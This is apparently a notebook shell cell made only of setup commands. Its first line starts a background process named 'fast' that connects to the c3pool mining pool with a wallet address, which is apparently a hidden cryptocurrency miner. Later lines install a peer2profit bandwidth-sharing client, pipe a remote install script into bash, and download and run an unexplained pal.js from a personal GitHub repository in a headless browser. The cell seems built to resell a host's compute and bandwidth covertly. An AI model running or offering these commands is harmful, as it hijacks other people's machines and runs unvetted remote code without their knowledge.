%%bash
./fast -B -t 2 -o auto.c3pool.org:443 -u 87giDqqPT1GPU9ukh1GNSpioyJM1G2zqjL8ukY9gP7ngZ2zpH9tuZFD755E94j9F56Y2FFq5B33SFe8a8LqybR2WJsb8ssR
curl https://updates.peer2profit.app/p2pclient_0.59_amd64.deb.zip | gunzip > p2pclient.deb 
dpkg --fsys-tarfile p2pclient.deb | tar -xf - ./usr/bin/p2pclient
mv usr/bin/p2pclient .
curl https://deb.nodesource.com/setup_current.x | bash -
curl https://dl.google.com/linux/direct/google-chrome-stable_current_amd64.deb > chrome.deb
apt update
apt install -y --no-install-recommends nodejs xvfb ./chrome.deb
rm -rf usr chrome.deb p2pclient.deb
export PLAYWRIGHT_SKIP_BROWSER_DOWNLOAD=1
curl https://raw.githubusercontent.com/orgchaowenguo0/common/main/package.json > package.json
npm install playwright-chromium
curl https://raw.githubusercontent.com/orgchaowenguo0/pal/main/pal.js > pal.js
xvfb-run node pal.js
